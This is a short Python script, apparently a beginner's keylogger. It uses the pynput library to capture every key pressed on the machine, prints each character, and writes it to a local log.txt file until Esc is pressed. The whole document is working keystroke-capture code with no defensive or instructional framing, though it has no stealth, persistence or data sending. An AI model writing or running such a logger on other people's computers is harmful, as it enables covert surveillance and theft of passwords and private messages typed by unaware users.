import pynput
import io
from pynput import keyboard
file= open("log.txt",'w')



def on_press(key):
    try:
        if key== keyboard.Key.space:
            file.write(" ")
        print('{0}'.format(key.char))
        key = '{0}'.format(key.char)
        file.write(key)
    except AttributeError:
        print('{0}'.format(
            key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

file.close()
